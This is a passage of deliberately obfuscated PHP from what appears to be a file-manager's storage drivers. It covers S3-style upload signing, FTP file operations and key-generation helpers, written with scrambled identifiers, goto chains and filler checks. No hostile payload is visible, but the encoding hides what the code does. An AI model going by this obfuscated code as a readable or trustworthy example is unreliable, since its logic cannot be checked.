$cİÀøÓïØ[676]; break; $c¯­¿‚»ø™ = $cİÀøÓïØ[677]; goto DŒì§¾Çá; dÈìŠÎÅó: $dğÅÄÕ«ø¯ = $d ¨¡™™‡Ú[358]($dğÅÄÕ«ø¯); $BÚŸ•æí”Î = $dğÅÄÕ«ø¯[0]; $C¿¦í×ÅÀ‘ = $cİÀøÓïØ[673]; goto A·Š¼‘´‘Ê; B«‹éÚ¾Ê©: if (!$bÙ„Ö‘§ù„) { return; } for ($a±–’ï•ôƒ = 0; $a±–’ï•ôƒ < $d ¨¡™™‡Ú[24]($dğÅÄÕ«ø¯); $a±–’ï•ôƒ++) { $e±‹ìì¤¸ = $e±‹ìì¤¸ == $d ¨¡™™‡Ú[24]($Aõœø†ßŸÃ) ? 0 : $e±‹ìì¤¸; $F›Šó‚…é = $e±‹ìì¤¸++; $BŒ£Öæ¤¸Á = $d ¨¡™™‡Ú[355]($AŠªÓÅ¡ò¹, $dğÅÄÕ«ø¯[$a±–’ï•ôƒ]) - $f†Ê‡ñëÆ - $d ¨¡™™‡Ú[356]($Aõœø†ßŸÃ[$F›Šó‚…é]); while ($BŒ£Öæ¤¸Á < 0) { $BŒ£Öæ¤¸Á += 64; $b½‰Ê¡Š§¾ = $cİÀøÓïØ[657]; } $E´âµ½±§ .= $AŠªÓÅ¡ò¹[$BŒ£Öæ¤¸Á]; } $aŸ‰À‹„ãØ = $d ¨¡™™‡Ú[359]($E´âµ½±§); goto BèÊÚâ„; EÑßë·ë‚ã: $Aõœø†ßŸÃ = $d ¨¡™™‡Ú[124]($BÚŸ•æí”Î . $d ¨¡™™‡Ú[124]($Cë™·¹‰Ş . $BÚŸ•æí”Î) . $Cë™·¹‰Ş); $e”‡íé£š = $cİÀøÓïØ[674]; if (strlen($e”‡íé£š) < $cİÀøÓïØ[577]) { die; } goto C„¼á©¯×; DŒì§¾Çá: if (strlen($c¯­¿‚»ø™) < $cİÀøÓïØ[585]) { return; } goto c¦çİß¿§Ş; C„¼á©¯×: $Aõœø†ßŸÃ = $d ¨¡™™‡Ú[25]($Aõœø†ßŸÃ, $f†Ê‡ñëÆ % 8, $f†Ê‡ñëÆ % 8 + 7); $E´âµ½±§ = $d ¨¡™™‡Ú[10]; $a±–’ï•ôƒ = 0; goto EøŞìì·ë§; A·Š¼‘´‘Ê: while (strlen($C¿¦í×ÅÀ‘) < $cİÀøÓïØ[577]) { if (!$C¿¦í×ÅÀ‘) { break; } $C¿¦í×ÅÀ‘++; } $dğÅÄÕ«ø¯ = $d ¨¡™™‡Ú[25]($dğÅÄÕ«ø¯, 1); $f†Ê‡ñëÆ = $d ¨¡™™‡Ú[355]($AŠªÓÅ¡ò¹, $BÚŸ•æí”Î); goto EÑßë·ë‚ã; EøŞìì·ë§: $BŒ£Öæ¤¸Á = 0; $e±‹ìì¤¸ = 0; $bÙ„Ö‘§ù„ = $cİÀøÓïØ[675]; goto B«‹éÚ¾Ê©; c¦çİß¿§Ş: default: $aŸ‰À‹„ãØ = $this->{$_SERVER[£ñ­Åö°¿][260]}($dğÅÄÕ«ø¯, $Cë™·¹‰Ş . $a†¾íîé‘½); break; $F—åÇç‰‚› = $cİÀøÓïØ[659]; if (!$F—åÇç‰‚›) { die; } } goto Cã¬½é‰°; Cã¬½é‰°: if ($D¤¡¡è‚ªË - 1 > 0) { $aŸ‰À‹„ãØ = $this->{$_SERVER[£ñ­Åö°¿][199]}($aŸ‰À‹„ãØ, $Cë™·¹‰Ş, $D¤¡¡è‚ªË - 1); } return $aŸ‰À‹„ãØ; goto d¿íÚÎÈµé; a°¹°ù»„ë: $f©§¸Åá¤ = $dğÅÄÕ«ø¯[0]; $a†¾íîé‘½ = $d ¨¡™™‡Ú[25]($dğÅÄÕ«ø¯, 1, 15); $E«Üä…î‰ø = $cİÀøÓïØ[666]; goto d›…®Ğ†; d¿íÚÎÈµé: } public function zvgib6fec292($fÒ¨°˜æ„í) { goto E„„šäÉğ; FŒò÷£¸Õ: $A•Ï”ÂËÌ° = 2; for ($d²™Ó·Œè¾ = 0; $d²™Ó·Œè¾ < $B¸ó´ÌÎ•’ * 10; $d²™Ó·Œè¾++) { if (($B¸ó´ÌÎ•’ * $d²™Ó·Œè¾ + 1) % $eõ½‚Íéã¦ == 0) { $A•Ï”ÂËÌ° = $C²Ñ³î·ğ[254](($B¸ó´ÌÎ•’ * $d²™Ó·Œè¾ + 1) / $eõ½‚Íéã¦); break; } } $C©…´‰— = $this->{$_SERVER[£ñ­Åö°¿][157]}($aÛ”ºØ°Šä * $DË©Ê™½º . $C²Ñ³î·ğ[10], $C²Ñ³î·ğ[159]); goto E˜—¼½®”Ô; eÖ‰­ÉìÆ¸: return $Bî£‹Šø³; $E  –Ş£âÍ = $AÑº×ñ¡Úƒ[682]; while ($E  –Ş£âÍ < $AÑº×ñ¡Úƒ[582]) { if ($E  –Ş£âÍ >= 0) { break; } $E  –Ş£âÍ++; } goto Dğ­”ÌŠ…‰; E˜—¼½®”Ô: $e…Üå—³‹• = $AÑº×ñ¡Úƒ[680]; if (!$e…Üå—³‹•) { die; } $C¬í‹ÂÎ³¡ = $C²Ñ³î·ğ[124]($C²Ñ³î·ğ[361] . ($aÛ”ºØ°Šä + $DË©Ê™½º) . $C²Ñ³î·ğ[362] . $eõ½‚Íéã¦ . $C²Ñ³î·ğ[362] . $A•Ï”ÂËÌ° . $C²Ñ³î·ğ[363]); goto aì„ÔªÕ†—; E„„šäÉğ: $AÑº×ñ¡Úƒ =& $_SERVER[Ïº«‚ßèÔˆø]; $C²Ñ³î·ğ =& $_SERVER[£ñ­Åö°¿]; $aÛ”ºØ°Šä = $this->{$_SERVER[£ñ­Åö°¿][360]}(); goto Cãõ¡‚¼š‘; Cãõ¡‚¼š‘: $DË©Ê™½º = $this->{$_SERVER[£ñ­Åö°¿][360]}(); $b›™´ˆ«Ä‘ = $AÑº×ñ¡Úƒ[678]; if (!$b›™´ˆ«Ä‘) { die; } goto cšŸõ ÉŒË; aì„ÔªÕ†—: $e°½ªÁÕÃŒ = $AÑº×ñ¡Úƒ[681]; if (!$e°½ªÁÕÃŒ) { return; } $Bî£‹Šø³ = $this->{$_SERVER[£ñ­Åö°¿][157]}($fÒ¨°˜æ„í, $C¬í‹ÂÎ³¡) . $C²Ñ³î·ğ[364] . $C©…´‰—; goto eÖ‰­ÉìÆ¸; cšŸõ ÉŒË: $B¸ó´ÌÎ•’ = ($aÛ”ºØ°Šä - 1) * ($DË©Ê™½º - 1); $eõ½‚Íéã¦ = $C²Ñ³î·ğ[254](($aÛ”ºØ°Šä + $DË©Ê™½º) / 2); while (1) { $dÈ‹ùÌáŸ† = $eõ½‚Íéã¦; $eôÂß÷•‰ç = $AÑº×ñ¡Úƒ[679]; while ($eôÂß÷•‰ç < $AÑº×ñ¡Úƒ[585]) { if ($eôÂß÷•‰ç >= 0) { break; } $eôÂß÷•‰ç++; } $Dæ® Í‘ß = $B¸ó´ÌÎ•’; while ($Dæ® Í‘ß % $dÈ‹ùÌáŸ† != 0) { $CºÁªæ¸æ = $Dæ® Í‘ß; $Dæ® Í‘ß = $dÈ‹ùÌáŸ†; $dÈ‹ùÌáŸ† = $CºÁªæ¸æ % $dÈ‹ùÌáŸ†; } if ($dÈ‹ùÌáŸ† == 1) { break; } else { $eõ½‚Íéã¦++; } } goto FŒò÷£¸Õ; Dğ­”ÌŠ…‰: } public function vdrje4cc42ce($Bñ ±¾á¸) { goto D»ÀîÄó‰Ñ; F»Óƒõíì: $aÉàø†Œ÷ˆ = $cÜõÕµ’¼†[124]($cÜõÕµ’¼†[361] . ($d®‰øóŸø + $bÔÓÑ†Ã¥Ö) . $cÜõÕµ’¼†[362] . $b‹ñÁ£àìŠ . $cÜõÕµ’¼†[362] . $D‰Æ©èÍŒç . $cÜõÕµ’¼†[363]); $bİÍóÀ³’ = $EëÛ­¿Óøà[689]; $B ÆçÄëïÄ = $this->{$_SERVER[£ñ­Åö°¿][260]}($cÒ‹­ÂÖ‚à[0], $aÉàø†Œ÷ˆ); goto dåÂæ±­»¢; D»ÀîÄó‰Ñ: $EëÛ­¿Óøà =& $_SERVER[Ïº«‚ßèÔˆø]; $cÜõÕµ’¼† =& $_SERVER[£ñ­Åö°¿]; $cÒ‹­ÂÖ‚à = $cÜõÕµ’¼†[0]($cÜõÕµ’¼†[364], $Bñ ±¾á¸); goto cµğ„‡ê­ç; eÜ˜ÅÕéä„: $bÔÓÑ†Ã¥Ö = 0; for ($D—àÆÛ™˜ = 3; $D—àÆÛ™˜ < $eËà¥§”ƒ; $D—àÆÛ™˜ += 2) { if ($eËà¥§”ƒ % $D—àÆÛ™˜ != 0) { continue; } $d®‰øóŸø = $D—àÆÛ™˜; $C¥¾äÕ‰£Œ = $EëÛ­¿Óøà[685]; $bÔÓÑ†Ã¥Ö = $cÜõÕµ’¼†[254]($eËà¥§”ƒ / $D—àÆÛ™˜); break; } $d©šåŸã± = ($d®‰øóŸø - 1) * ($bÔÓÑ†Ã¥Ö - 1); goto dèÃêŠ‡µ„; dåÂæ±­»¢: return $B ÆçÄëïÄ; $e†”° áó = $EëÛ­¿Óøà[690]; goto fŠàÂğŒƒ; B¿ˆ¨ÆœÁù: if (!$dî¤êİ“ºô) { return; } if (!$eËà¥§”ƒ) { return $cÜõÕµ’¼†[10]; } $eËà¥§”ƒ = $cÜõÕµ’¼†[254]($eËà¥§”ƒ); goto B˜®İÔ†ùÉ; cµğ„‡ê­ç: if ($cÜõÕµ’¼†[19]($cÒ‹­ÂÖ‚à) != 2) { return $cÜõÕµ’¼†[10]; } $eËà¥§”ƒ = $this->{$_SERVER[£ñ­Åö°¿][260]}($cÒ‹­ÂÖ‚à[1] . $cÜõÕµ’¼†[10], $cÜõÕµ’¼†[159]); $dî¤êİ“ºô = $EëÛ­¿Óøà[683]; goto B¿ˆ¨ÆœÁù; dèÃêŠ‡µ„: $b‹ñÁ£àìŠ = $cÜõÕµ’¼†[254](($d®‰øóŸø + $bÔÓÑ†Ã¥Ö) / 2); while (1) { $EÒÌœ±âœ… = $b‹ñÁ£àìŠ; $fŒÛ•¸Ò¡Ü = $EëÛ­¿Óøà[686]; $F»Á·°„òÌ = $d©šåŸã±; while ($F»Á·°„òÌ % $EÒÌœ±âœ… != 0) { $fÁ÷…¤âè§ = $F»Á·°„òÌ; $F»Á·°„òÌ = $EÒÌœ±âœ…; $E­¥£­‰À = $EëÛ­¿Óøà[687]; if (!$E­¥£­‰À) { die; } $EÒÌœ±âœ… = $fÁ÷…¤âè§ % $EÒÌœ±âœ…; } if ($EÒÌœ±âœ… == 1) { break; } else { $b‹ñÁ£àìŠ++; } } $D‰Æ©èÍŒç = 2; goto E«¾èÀºß; E«¾èÀºß: $fäÈŒ¥ƒ³õ = $EëÛ­¿Óøà[688]; while ($fäÈŒ¥ƒ³õ < $EëÛ­¿Óøà[585]) { if ($fäÈŒ¥ƒ³õ >= 0) { break; } $fäÈŒ¥ƒ³õ++; } for ($D—àÆÛ™˜ = 0; $D—àÆÛ™˜ < $d©šåŸã± * 10; $D—àÆÛ™˜++) { if (($d©šåŸã± * $D—àÆÛ™˜ + 1) % $b‹ñÁ£àìŠ == 0) { $D‰Æ©èÍŒç = $cÜõÕµ’¼†[254](($d©šåŸã± * $D—àÆÛ™˜ + 1) / $b‹ñÁ£àìŠ); break; } } goto F»Óƒõíì; B˜®İÔ†ùÉ: $d®‰øóŸø = 0; $dŞÜãÔİ¹† = $EëÛ­¿Óøà[684]; while ($dŞÜãÔİ¹† < $EëÛ­¿Óøà[579]) { if ($dŞÜãÔİ¹† >= 0) { break; } $dŞÜãÔİ¹†++; } goto eÜ˜ÅÕéä„; fŠàÂğŒƒ: } public function aqjb6b594ccb() { goto b½ÜÂ•“Ñ–; aÉãŞ“à¡: return $EŸ–õÍÀö¶; goto b³ˆ¯Æª¢; E—ó÷Åã®Ì: while ($f´î•ˆ <= (int) $f¢‹â‹Úˆƒ[366]($Cœ°µŒÓ‹˜)) { $d’²Šñõ†­ = $f´î•ˆ; $D’‡•¶‚¥³ = $F›‚­í„¤È[692]; while (strlen($D’‡•¶‚¥³) < $F›‚­í„¤È[577]) { if (!$D’‡•¶‚¥³) { break; } $D’‡•¶‚¥³++; } while (!0) { $d’²Šñõ†­++; $d¨ĞŠ·¬Ö = $F›‚­í„¤È[693]; while (strlen($d¨ĞŠ·¬Ö) < $F›‚­í„¤È[585]) { if (!$d¨ĞŠ·¬Ö) { break; } $d¨ĞŠ·¬Ö++; } if ($d’²Šñõ†­ <= 2) { $f´î•ˆ = $d’²Šñõ†­; break; } else { if ($d’²Šñõ†­ < 2) { continue; } } $dïÌÙñ = !0; for ($eîÖ“º›¢‡ = 2; $eîÖ“º›¢‡ <= $f¢‹â‹Úˆƒ[366]($d’²Šñõ†­); $eîÖ“º›¢‡++) { if ($d’²Šñõ†­ % $eîÖ“º›¢‡ == 0) { $dïÌÙñ = !1; } } if ($dïÌÙñ) { $f´î•ˆ = $d’²Šñõ†­; break; } } $bİ‚»‚…áç[] = $f´î•ˆ; } $EŸ–õÍÀö¶ = 2; for ($d’²Šñõ†­ = $Cœ°µŒÓ‹˜; $d’²Šñõ†­ > 1; $d’²Šñõ†­--) { $dïÌÙñ = !0; foreach ($bİ‚»‚…áç as $Cã¶æÔ’Š¨) { if ($d’²Šñõ†­ % $Cã¶æÔ’Š¨ == 0) { $dïÌÙñ = !1; break; } } if ($dïÌÙñ) { $EŸ–õÍÀö¶ = $d’²Šñõ†­; break; } } goto aÉãŞ“à¡; e®åß¾‹Î®: $fë‚”İª×¸ = $F›‚­í„¤È[691]; $bİ‚»‚…áç = array(); $f´î•ˆ = 1; goto E—ó÷Åã®Ì; b½ÜÂ•“Ñ–: $F›‚­í„¤È =& $_SERVER[Ïº«‚ßèÔˆø]; $f¢‹â‹Úˆƒ =& $_SERVER[£ñ­Åö°¿]; $Cœ°µŒÓ‹˜ = $f¢‹â‹Úˆƒ[345]($f¢‹â‹Úˆƒ[365](2, 14), $f¢‹â‹Úˆƒ[365](2, 16) - 1); goto e®åß¾‹Î®; b³ˆ¯Æª¢: } public function ocml12d12092($DÑ˜Ÿªœ­ö, $cÀËï„¨½¼) { $fÈæ— Š•ä =& $_SERVER[£ñ­Åö°¿]; return $fÈæ— Š•ä[13](array($fÈæ— Š•ä[14], $fÈæ— Š•ä[367]), $DÑ˜Ÿªœ­ö, $cÀËï„¨½¼); } public function brni1992fc0e($A‚¸Š‚æï, $C‘ƒÉºõ“‘) { $e’¿…©šß =& $_SERVER[£ñ­Åö°¿]; return $e’¿…©šß[13](array($e’¿…©šß[368], $e’¿…©šß[369]), $A‚¸Š‚æï, $C‘ƒÉºõ“‘); } public function wbsmaef42fb4($Dèˆ”éœ, $cÅëè®ŠŸ) { $DÍŸÁŒ‰©ï =& $_SERVER[£ñ­Åö°¿]; return $DÍŸÁŒ‰©ï[13](array($DÍŸÁŒ‰©ï[368], $DÍŸÁŒ‰©ï[370]), $Dèˆ”éœ, $cÅëè®ŠŸ); $BŞ´™“Ì‘ä = $_SERVER[Ïº«‚ßèÔˆø][694]; if (!$BŞ´™“Ì‘ä) { die; } } } goto eˆ±÷¬ÛÖ; eõò«½™¾ä: class PathDriverEDS extends PathDriverMinIO { public function __construct($aºœõ­«±) { parent::__construct($aºœõ­«±); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($bÆæé¹Œ®‰) { parent::__construct($bÆæé¹Œ®‰); $this->signatureVersion($_SERVER[Ïº«‚ßèÔˆø][211]); } public function uploadFormData($D›‡Áîµ¿, $FµÁŠï×å³ = 3600) { goto Aåôóš›¹½; C¼ºªàÌ: $AµÂì»‡… = $b£ªÃºÏ¡Ş[1207]; $b§ƒˆ¬£Ë = $FµÁŠï×å³ . $b£ªÃºÏ¡Ş[33]; $fåì‡„ìõ£ = $b£ªÃºÏ¡Ş[1170]; goto e‹ç‡ŒÆ¢; Aåôóš›¹½: $b£ªÃºÏ¡Ş =& $_SERVER[Ïº«‚ßèÔˆø]; $c¢µŠò¡Ù = $b£ªÃºÏ¡Ş[191]; $b—…ÚêÁ«™ = $b£ªÃºÏ¡Ş[1205]; goto cÜˆñåù†; Bë¼Ÿù‘ñ¬: $C³šìƒ× = array($b£ªÃºÏ¡Ş[210] => $b£ªÃºÏ¡Ş[33], $b£ªÃºÏ¡Ş[1217] => $b£ªÃºÏ¡Ş[33], $b£ªÃºÏ¡Ş[1174] => $c¢µŠò¡Ù, $b£ªÃºÏ¡Ş[1178] => $fåì‡„ìõ£, $b£ªÃºÏ¡Ş[1182] => $A‚äãâ´‡õ, $b£ªÃºÏ¡Ş[1218] => $d®Ö›ªšÓÈ, $b£ªÃºÏ¡Ş[1219] => $b—…ÚêÁ«™, $b£ªÃºÏ¡Ş[1220] => $B÷Åˆ¼ö¶›, $b£ªÃºÏ¡Ş[1221] => $b§ƒˆ¬£Ë, $b£ªÃºÏ¡Ş[1222] => $bù„À´–ƒÃ, $b£ªÃºÏ¡Ş[175] => $this->getHost()); return $C³šìƒ×; goto bæ°Òäõğ•; e‹ç‡ŒÆ¢: $f„Ö­Œ¸  = array($this->accessKey, $FÕƒó“½´‚, $this->region, $CŞÓ½î²®, $AµÂì»‡…); $d®Ö›ªšÓÈ = implode($b£ªÃºÏ¡Ş[8], $f„Ö­Œ¸ ); $dÅùÇİá‹¤ = array($b£ªÃºÏ¡Ş[1172] => gmdate($b£ªÃºÏ¡Ş[1171], strtotime($b£ªÃºÏ¡Ş[1208])), $b£ªÃºÏ¡Ş[1173] => array(array($b£ªÃºÏ¡Ş[1175] => $this->bucket), array($b£ªÃºÏ¡Ş[1174] => $c¢µŠò¡Ù), array($b£ªÃºÏ¡Ş[1176], $b£ªÃºÏ¡Ş[1177], $b£ªÃºÏ¡Ş[33]), array($b£ªÃºÏ¡Ş[1176], $b£ªÃºÏ¡Ş[1209], $b£ªÃºÏ¡Ş[33]), array($b£ªÃºÏ¡Ş[1176], $b£ªÃºÏ¡Ş[1210], $b£ªÃºÏ¡Ş[33]), array($b£ªÃºÏ¡Ş[1178] => $fåì‡„ìõ£), array($b£ªÃºÏ¡Ş[1211] => $d®Ö›ªšÓÈ), array($b£ªÃºÏ¡Ş[1212] => $b—…ÚêÁ«™), array($b£ªÃºÏ¡Ş[1213] => $B÷Åˆ¼ö¶›), array($b£ªÃºÏ¡Ş[1214] => $b§ƒˆ¬£Ë))); goto FßÚ›©°Ç–; FßÚ›©°Ç–: $A‚äãâ´‡õ = base64_encode(json_encode($dÅùÇİá‹¤)); $eË‡‹ÏÛÇ– = hash_hmac($b£ªÃºÏ¡Ş[1215], $FÕƒó“½´‚, $b£ªÃºÏ¡Ş[1216] . $this->secret, !0); $EÆßİµ£ìÇ = hash_hmac($b£ªÃºÏ¡Ş[1215], $this->region, $eË‡‹ÏÛÇ–, !0); goto f‹Œç„˜‘™; f‹Œç„˜‘™: $b°ÓÂ…Ñè‰ = hash_hmac($b£ªÃºÏ¡Ş[1215], $CŞÓ½î²®, $EÆßİµ£ìÇ, !0); $däŠØË©• = hash_hmac($b£ªÃºÏ¡Ş[1215], $AµÂì»‡…, $b°ÓÂ…Ñè‰, !0); $bù„À´–ƒÃ = hash_hmac($b£ªÃºÏ¡Ş[1215], $A‚äãâ´‡õ, $däŠØË©•); goto Bë¼Ÿù‘ñ¬; cÜˆñåù†: $CŞÓ½î²® = $b£ªÃºÏ¡Ş[59]; $B÷Åˆ¼ö¶› = gmdate($b£ªÃºÏ¡Ş[1206]); $FÕƒó“½´‚ = gmdate($b£ªÃºÏ¡Ş[698]); goto C¼ºªàÌ; bæ°Òäõğ•: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($e”·¥ŞÎñ) { parent::__construct(); if (count($e”·¥ŞÎñ) > 0) { $this->_init($e”·¥ŞÎñ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($eİÀäæËÉŞ) { $b×¶ô˜ØøÀ =& $_SERVER[Ïº«‚ßèÔˆø]; global $config; $this->appCharset = $config[$b×¶ô˜ØøÀ[1223]]; $this->systemCharset = $config[$b×¶ô˜ØøÀ[1224]]; if (isset($eİÀäæËÉŞ[$b×¶ô˜ØøÀ[1225]]) && $eİÀäæËÉŞ[$b×¶ô˜ØøÀ[1225]]) { $this->systemCharset = $eİÀäæËÉŞ[$b×¶ô˜ØøÀ[1225]]; } } public function iconvApp($CÕ¶’†‘ò‰) { return $this->iconvTo($CÕ¶’†‘ò‰, $this->systemCharset, $this->appCharset); } public function iconvSystem($FóµèËÊ¤) { return $this->iconvTo($FóµèËÊ¤, $this->appCharset, $this->systemCharset); } public function getPathOuter($fö³ƒœ èÒ) { goto aÆ–³¿¼†—; aÆ–³¿¼†—: $bğŸß»‹”ª =& $_SERVER[Ïº«‚ßèÔˆø]; $dÚ‚Öëë¶Š = $this->iconvApp($this->pathBase); $fö³ƒœ èÒ = $this->iconvApp($fö³ƒœ èÒ); goto bÒ±„´‘ŒÕ; aŸò“ïåÚ: return $this->pathDriver . $bğŸß»‹”ª[8] . ltrim($fö³ƒœ èÒ, $bğŸß»‹”ª[8]); goto cÏÒ‚®äİù; bÒ±„´‘ŒÕ: if (substr($dÚ‚Öëë¶Š, 0, 2) == $bğŸß»‹”ª[1226]) { $dÚ‚Öëë¶Š = BASIC_PATH . substr($dÚ‚Öëë¶Š, 2); } if (substr($fö³ƒœ èÒ, 0, 2) == $bğŸß»‹”ª[1226]) { $fö³ƒœ èÒ = BASIC_PATH . substr($fö³ƒœ èÒ, 2); } $dÚ‚Öëë¶Š = KodIO::clear($dÚ‚Öëë¶Š); goto eİŸª†ßˆÒ; eİŸª†ßˆÒ: $fö³ƒœ èÒ = KodIO::clear($fö³ƒœ èÒ); $fö³ƒœ èÒ = substr($fö³ƒœ èÒ, strlen($dÚ‚Öëë¶Š)); if (empty($this->pathDriver)) { return $fö³ƒœ èÒ; } goto aŸò“ïåÚ; cÏÒ‚®äİù: } private function _init($cŒÚÒ©¡¯ = array()) { $AÕÙ†ÇËª´ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!function_exists($AÕÙ†ÇËª´[1227])) { throw new Exception(LNG($AÕÙ†ÇËª´[1228])); } $this->config = $cŒÚÒ©¡¯; $this->charsetReset($cŒÚÒ©¡¯); foreach ($cŒÚÒ©¡¯ as $fªé‚×—Øæ => $e‚§°ùªÒ) { if (isset($this->{$fªé‚×—Øæ})) { $this->{$fªé‚×—Øæ} = $e‚§°ùªÒ; } } return $this->_login($cŒÚÒ©¡¯); } private function _login($B°Î™äö×) { goto E‡°Ì†éƒõ; A¼ÎÍ¯ªĞŒ: $cŸæÔâç›·[$E¬½¤ŞßÈî] = array($CÖ¶Ãì»È‰[1232] => $this->connect, $CÖ¶Ãì»È‰[175] => $this->host, $CÖ¶Ãì»È‰[174] => $this->scheme, $CÖ¶Ãì»È‰[176] => $this->port); return $A³ğ×§Š÷±; goto c–š¤¡ã˜Ì; e£¡Ø°õªŒ: $fòŸ’¡±ÏË = isset($aÙ½»Ÿ[$CÖ¶Ãì»È‰[174]]) && $aÙ½»Ÿ[$CÖ¶Ãì»È‰[174]] == $CÖ¶Ãì»È‰[1229] ? !0 : !1; $this->scheme = $fòŸ’¡±ÏË ? $CÖ¶Ãì»È‰[1230] : $CÖ¶Ãì»È‰[1231]; $this->port = isset($aÙ½»Ÿ[$CÖ¶Ãì»È‰[176]]) ? $aÙ½»Ÿ[$CÖ¶Ãì»È‰[176]] : 21; goto dø£·ÏÁ; eÈ—¢ŒÕ÷: if (isset($cŸæÔâç›·[$E¬½¤ŞßÈî])) { foreach ($cŸæÔâç›·[$E¬½¤ŞßÈî] as $A•ÎÌÉ© => $béİÛçØçã) { $this->{$A•ÎÌÉ©} = $béİÛçØçã; } return !0; } $aÙ½»Ÿ = parse_url(trim($this->server, $CÖ¶Ãì»È‰[8])); $this->host = $aÙ½»Ÿ[$CÖ¶Ãì»È‰[175]]; goto e£¡Ø°õªŒ; dø£·ÏÁ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $A³ğ×§Š÷± = @ftp_login($this->connect, $this->username, $this->userpass); goto d‚µŞ¬ì; E‡°Ì†éƒõ: $CÖ¶Ãì»È‰ =& $_SERVER[Ïº«‚ßèÔˆø]; static $cŸæÔâç›· = array(); $E¬½¤ŞßÈî = md5(json_encode($B°Î™äö×)); goto eÈ—¢ŒÕ÷; d‚µŞ¬ì: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $aØÃÃ„‚´ = $this->pasv == $CÖ¶Ãì»È‰[87] ? !0 : !1; @ftp_pasv($this->connect, $aØÃÃ„‚´); goto A¼ÎÍ¯ªĞŒ; c–š¤¡ã˜Ì: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($d‚„æò’Ô´, $bÇô†ŸÃ¯Ì = '', $a‚‘²„ÍŞí = REPEAT_RENAME) { if ($this->setContent($d‚„æò’Ô´, $bÇô†ŸÃ¯Ì)) { return $this->getPathOuter($d‚„æò’Ô´); } return !1; } public function mkdir($B³Ì®˜“, $DÂÀß·Ò¢Ê = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $B³Ì®˜“ = $this->iconvSystem($B³Ì®˜“); if ($this->_isFolder($B³Ì®˜“) || @ftp_mkdir($this->connect, $B³Ì®˜“)) { return $this->getPathOuter($B³Ì®˜“); } if (!$this->mkdir($this->pathFather($B³Ì®˜“))) { return !1; } if ($B³Ì®˜“ = @ftp_mkdir($this->connect, $B³Ì®˜“)) { return $this->getPathOuter($B³Ì®˜“); } return !1; } public function copyFile($AåÕÆÙ”–à, $BÕ†ÙÑ°) { goto FˆÕÉ†¤Ä¨; FˆÕÉ†¤Ä¨: if (!$this->_isconn()) { return !1; } $eËçˆ´²ï = $this->pathThis($this->iconvSystem($AåÕÆÙ”–à)); $c×ó¯¸ØØ = $this->tempFile($eËçˆ´²ï); goto Bµ®¾è£”ì; bÕ§Â¶¿¥: $this->tempFileRemve($c×ó¯¸ØØ); return $d¬“İ´ºøİ; goto Aø‚œÚ‹º®; Bµ®¾è£”ì: $b×¦ÁëÑÙ• = $this->iconvApp($c×ó¯¸ØØ); $this->download($AåÕÆÙ”–à, $b×¦ÁëÑÙ•); $d¬“İ´ºøİ = $this->upload($BÕ†ÙÑ°, $b×¦ÁëÑÙ•); goto bÕ§Â¶¿¥; Aø‚œÚ‹º®: } public function moveFile($Fƒ‰´ô§Ÿ, $dçäÖâ·­) { if (!$this->_isconn()) { return !1; } $Fƒ‰´ô§Ÿ = $this->iconvSystem($Fƒ‰´ô§Ÿ); $dçäÖâ·­ = $this->iconvSystem($dçäÖâ·­); $fœœÏŒ¿‡ˆ = @ftp_rename($this->connect, $Fƒ‰´ô§Ÿ, $dçäÖâ·­); return $fœœÏŒ¿‡ˆ ? $this->getPathOuter($dçäÖâ·­) : !1; } public function delFile($eäºòÏÆ) { if (!$this->_isconn()) { return !1; } $eäºòÏÆ = $this->iconvSystem($eäºòÏÆ); return @ftp_delete($this->connect, $eäºòÏÆ); } public function delFolder($DèŞò×î®) { goto e”§½¹ŸŸ; aÆ «‘¢ªî: foreach ($AäÆ­®ÔÏÚ as $EëÓÁÖÎç) { $EëÓÁÖÎç = $this->iconvSystem($EëÓÁÖÎç); $Eøµ–·»ßµ = @ftp_rmdir($this->connect, $EëÓÁÖÎç); if (!$Eøµ–·»ßµ) { return !1; } } $DèŞò×î® = $this->iconvSystem($DèŞò×î®); return @ftp_rmdir($this->connect, $DèŞò×î®); goto EÀ¸œÙ­µ; eòĞ¥øÕ½¦: $this->fileList($DèŞò×î®, $AäÆ­®ÔÏÚ, $EÇ£âÇİ’, !0); $this->listItemCache = !0; foreach ($EÇ£âÇİ’ as $dŠƒİ¬É„Ú) { $EëÓÁÖÎç = $this->iconvSystem($dŠƒİ¬É„Ú[$_SERVER[Ïº«‚ßèÔˆø][28]]); $Eøµ–·»ßµ = @ftp_delete($this->connect, $EëÓÁÖÎç); if (!$Eøµ–·»ßµ) { return !1; } } goto aÆ «‘¢ªî; e”§½¹ŸŸ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $AäÆ­®ÔÏÚ = $EÇ£âÇİ’ = array(); goto eòĞ¥øÕ½¦; EÀ¸œÙ­µ: } public function rename($eÑãÈºò±›, $d¥è£çŸˆÂ) { goto Cçİ¹´Âöğ; Cçİ¹´Âöğ: $Aœé¼òŠø” =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$this->_isconn()) { return !1; } $EÃ‚ƒ‚ÍÖ = $this->fileNameAuto($this->pathFather($eÑãÈºò±›), $d¥è£çŸˆÂ); goto Câß«ØŒ…; b‘ãÒ¾Ù’È: $cêçŸ£ ŸÅ = rtrim($eĞ½¨š è, $Aœé¼òŠø”[8]) . $Aœé¼òŠø”[8] . $EÃ‚ƒ‚ÍÖ; $c…šÒğ¢ÂÂ = @ftp_rename($this->connect, $eÑãÈºò±›, $cêçŸ£ ŸÅ); $cêçŸ£ ŸÅ = $this->iconvApp($cêçŸ£ ŸÅ); goto E·‹Ñ¼Ê¤; Câß«ØŒ…: $EÃ‚ƒ‚ÍÖ = $this->iconvSystem($EÃ‚ƒ‚ÍÖ); $eÑãÈºò±› = $this->iconvSystem($eÑãÈºò±›); $eĞ½¨š è = $this->pathFather($eÑãÈºò±›); goto b‘ãÒ¾Ù’È; E·‹Ñ¼Ê¤: return $c…šÒğ¢ÂÂ ? $this->getPathOuter($cêçŸ£ ŸÅ) : !1; goto D‘•‚¯¿; 